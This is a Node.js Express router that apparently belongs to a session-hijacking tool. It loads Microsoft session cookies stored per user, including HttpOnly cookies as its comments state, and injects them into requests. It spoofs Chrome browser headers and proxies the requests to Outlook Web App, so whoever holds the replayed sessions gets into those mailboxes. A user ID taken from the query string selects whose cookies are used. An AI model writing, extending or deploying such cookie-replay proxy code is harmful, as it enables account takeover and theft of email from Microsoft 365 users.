const express = require("express");
const { createProxyMiddleware } = require("http-proxy-middleware");
const User = require("../models/user");
const router = express.Router();

// Enhanced cookie injection middleware
const injectCookies = async (req, res, next) => {
  try {
    const userId = req.session.userId || req.query.userId;
    if (userId) {
      const user = await User.findById(userId);
      if (user && user.microsoftCookies.length > 0) {
        // Inject ALL cookies (including HttpOnly) into request headers
        const cookiePairs = user.microsoftCookies
          .filter(c => c.name && c.value && c.name.trim() !== '')
          .map(c => `${c.name}=${c.value}`);
        
        if (cookiePairs.length > 0) {
          req.headers.cookie = cookiePairs.join('; ');
          
          // Also set additional headers to mimic original browser
          req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
          req.headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
          req.headers['accept-language'] = 'en-US,en;q=0.5';
          req.headers['accept-encoding'] = 'gzip, deflate, br';
          req.headers['dnt'] = '1';
          req.headers['connection'] = 'keep-alive';
          req.headers['upgrade-insecure-requests'] = '1';
          
          console.log(`✅ Injected ${cookiePairs.length} cookies for ${user.email}`);
        }
      }
    }
    next();
  } catch (error) {
    console.error('Cookie injection error:', error);
    next();
  }
};

// Outlook Web App Proxy
router.use("/outlook", injectCookies, createProxyMiddleware({
  target: "https://outlook.office.com",
  changeOrigin: true,
  pathRewrite: {
    "^/proxy/outlook": ""
  },
  onProxyReq: (proxyReq, req, res) => {
    // Modify request headers
    proxyReq.setHeader('User-Agent', req.headers['user-agent']);
    proxyReq.setHeader('Accept', req.headers.accept);
  },
  onProxyRes: (proxyRes, req, res) => {
    // Modify response for branding
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      // Custom branding injection would go here
      proxyRes.headers['x-custom-proxy'] = 'outlook-proxy';
    }
  }
}));

module.exports = router;